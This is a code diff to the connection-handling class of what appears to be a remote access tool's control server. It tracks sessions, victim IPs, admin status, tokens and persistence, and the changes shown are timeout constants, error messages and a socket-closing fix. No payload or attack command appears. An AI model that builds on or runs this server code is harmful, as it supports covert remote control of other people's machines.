@@ -6,7 +6,7 @@ import os
 import binascii
 from .other import printColor
 from .sql import Sql
-from .other import NB_SESSION , NB_SOCKET , NB_IP , NB_PORT , NB_ALIVE , NB_ADMIN , NB_PATH , NB_USERNAME , NB_TOKEN
+from .other import NB_SESSION , NB_SOCKET , NB_IP , NB_PORT , NB_ALIVE , NB_ADMIN , NB_PATH , NB_USERNAME , NB_TOKEN, SOCK_TIMEOUT
 
 
 
@@ -29,12 +29,11 @@ class Handler(threading.Thread):
         self.display = display
         self.auto_persistence = auto_persistence
         self.ObjSql = ObjSql
-        self.initialization()
+        
 
     def initialization(self):
         """
         filled in the dictionary dict_conn via the database.
-        All sockets are equal to False because once the server is down it is complicated to save an object (socket).
         (The socket is not saved by default in the database).
         """
         self.ObjSql.createDb()
@@ -45,7 +44,7 @@ class Handler(threading.Thread):
                 session = list_of_rows[row][0]
                 sock = False #
                 ip = list_of_rows[row][1]
-                port =  False
+                port =  "---"
                 is_he_alive = False
                 is_he_admin = self.ObjSql.setTrueOrFalse(list_of_rows[row][4])
                 path_rat = list_of_rows[row][5]
@@ -72,8 +71,8 @@ class Handler(threading.Thread):
             print("\n")
             for key,value in Handler.dict_conn.items():
                 if(value[NB_ALIVE]):
-                    value[0].close()
-                    printColor("error","[-] {}:{} Connection closed.".format(NB_IP,NB_PORT))
+                    value[NB_SOCKET].close()
+                    printColor("error","[-] {}:{} Connection closed.".format(value[NB_IP],value[NB_PORT]))
                 
         except Exception  as e: 
             printColor("error","[-] Error closing a socket. Error: {}".format(e))
@@ -131,7 +130,6 @@ The client first sends this information, then the server sends the parameters as
     def generateToken(self):
         return binascii.hexlify(os.urandom(24)).decode("utf8")
 
-
     def sendUltraSafe(self, data):
         
         try:
@@ -142,10 +140,10 @@ The client first sends this information, then the server sends the parameters as
         else:
             try:
                # print("EN ATTENTE dans la reponse de ultrasafe")
-                self.conn.settimeout(3)
+                self.conn.settimeout(SOCK_TIMEOUT)
                 confirmation = self.conn.recv(4096).decode("utf8")
             except Exception as e:
-                print("ERROR 2020",e)
+                printColor("error","Error in sendUltraSafe: {}\n".format(e))
             else:
                 if(confirmation == "confirmation"):
                     print("IN SENDULTRASAFE CONFIRMATION OK")
@@ -157,19 +155,19 @@ The client first sends this information, then the server sends the parameters as
 
     def recvUltraSafe(self):
         data = ""
-        self.conn.settimeout(3)
+        self.conn.settimeout(SOCK_TIMEOUT)
         try:
             data = self.conn.recv(4096).decode("utf8")
         except socket.timeout:
             print("timeout in recvultrasafe")
-        except Exception:
-            print("error 2021")
+        except Exception as e:
+            printColor("error", "[-] Error in recvUltraSafe: {} .\n".format(e))
         else:   
             try:
                 #print("SEND confirmation in recvultrasafe.")
                 self.conn.send(b"confirmation")
             except Exception:
-                print("EXCEPTION in recvULTRASAFE CONFIRMATION")
+                printColor("error", "[-] Error in recvUltraSafe when confirming.")
  
         self.conn.settimeout(None)
         return data
